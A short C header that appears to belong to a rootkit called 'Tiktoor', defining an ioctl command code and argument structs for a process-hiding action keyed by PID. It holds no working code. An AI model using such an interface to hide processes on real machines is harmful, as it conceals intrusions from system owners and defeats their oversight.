#define TIKTOOR_IOCTL_CMD 0xdeadbeaf

struct TiktoorCmdArg {
    unsigned char action;
    void *subargs;
};

struct ProcessHidingSubargs {
    unsigned int pid;
};
